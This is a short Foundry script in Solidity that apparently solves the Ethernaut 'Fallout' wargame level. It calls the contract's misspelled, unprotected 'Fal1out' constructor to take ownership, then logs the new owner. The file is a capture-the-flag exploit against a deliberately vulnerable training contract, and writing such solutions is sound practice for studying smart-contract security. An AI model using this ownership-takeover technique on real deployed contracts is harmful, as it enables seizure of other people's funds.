// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutSolution is Script {
    Fallout public fallout = Fallout(0x210Fe071fC82ae1D25A18105dE411fF517Af5018);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallout.Fal1out{value: 1 wei}();
        console.log("the owner of the cntract is: ", fallout.owner());
        console.log("The address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
